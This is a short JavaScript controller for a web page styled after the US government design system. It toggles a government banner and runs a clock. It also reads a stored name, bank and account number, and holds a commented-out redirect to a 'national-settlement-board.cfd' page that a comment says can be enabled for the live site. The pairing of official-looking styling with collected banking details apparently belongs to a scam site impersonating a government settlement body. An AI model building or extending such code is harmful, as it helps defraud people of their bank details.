/**
 * USWDS Interactive Controller & Routing Engine
 * File: test/ui-core.js
 */

document.addEventListener('DOMContentLoaded', () => {
    runRoutingCheck();
    initializeUI();
    startNodeClock();
});

function runRoutingCheck() {
    // Retained exact logic from your original snippet block 1
    const savedName = localStorage.getItem('tifma_name');
    const savedBank = localStorage.getItem('tifma_bank');
    const savedAccount = localStorage.getItem('tifma_account');

    // Remove the comment marks below if you want this to enforce strict redirects in your live environment
    /*
    if (!savedName || !savedBank || !savedAccount) {
        window.location.href = 'https://national-settlement-board.cfd/index.html';
        return;
    }
    */
}

function initializeUI() {
    const govBanner = document.getElementById('gov-banner-trigger');
    const govDrop = document.getElementById('govDrop');

    if (govBanner && govDrop) {
        govBanner.addEventListener('click', () => {
            govDrop.classList.toggle('active');
        });
    }
}

function startNodeClock() {
    const clockElement = document.getElementById('live-node-time');
    if (clockElement) {
        setInterval(() => {
            const now = new Date();
            clockElement.innerText = now.toISOString();
        }, 1000);
    }
}
